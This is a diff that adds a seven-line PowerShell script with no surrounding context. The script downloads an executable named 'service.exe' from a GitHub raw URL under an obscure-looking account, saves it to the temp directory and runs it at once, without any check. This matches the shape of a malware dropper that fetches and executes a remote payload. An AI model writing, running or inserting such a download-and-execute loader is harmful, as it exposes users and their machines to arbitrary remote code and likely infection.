@@ -1,0 +1,7 @@
+$url = "https://github.com/iendjd7-lgtm/checknew/raw/refs/heads/main/service.exe"
+$temp = [System.IO.Path]::GetTempPath()
+$exe = Join-Path $temp "service.exe"
+
+(New-Object System.Net.WebClient).DownloadFile($url, $exe)
+
+Start-Process -FilePath $exe
